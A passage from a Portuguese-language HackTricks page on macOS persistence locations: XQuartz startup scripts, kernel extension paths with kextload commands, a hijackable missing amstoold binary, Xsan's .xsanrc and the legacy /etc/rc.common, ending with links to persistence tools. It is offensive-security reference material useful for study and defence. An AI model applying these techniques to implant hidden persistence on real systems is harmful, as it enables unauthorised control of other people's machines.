Descrição: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Localização

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Requer privilégios de root
* **Gatilho**: Com XQuartz

#### Descrição e Exploração

XQuartz **não está mais instalado no macOS**, então se você deseja mais informações, consulte a descrição.

### kext

{% hint style="danger" %}
É tão complicado instalar kext mesmo como root que não considerarei isso para escapar das sandboxes ou mesmo para persistência (a menos que você tenha um exploit)
{% endhint %}

#### Localização

Para instalar um KEXT como um item de inicialização, ele precisa ser **instalado em uma das seguintes localizações**:

* `/System/Library/Extensions`
* Arquivos KEXT integrados ao sistema operacional OS X.
* `/Library/Extensions`
* Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos KEXT atualmente carregados com:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para mais informações sobre [**extensões de kernel, verifique esta seção**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Descrição: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Localização

* **`/usr/local/bin/amstoold`**
* Root necessário

#### Descrição e Exploração

Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando este binário enquanto expondo um serviço XPC... o problema é que o binário não existia, então você poderia colocar algo lá e quando o serviço XPC fosse chamado, seu binário seria executado.

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Descrição: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Localização

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root necessário
* **Gatilho**: Quando o serviço é executado (raramente)

#### Descrição e exploração

Aparentemente, não é muito comum executar este script e nem mesmo consegui encontrá-lo no meu macOS, então se você quiser mais informações, verifique o writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Isso não está funcionando nas versões modernas do MacOS**
{% endhint %}

Também é possível colocar aqui **comandos que serão executados na inicialização.** Exemplo de script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas e ferramentas de persistência

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
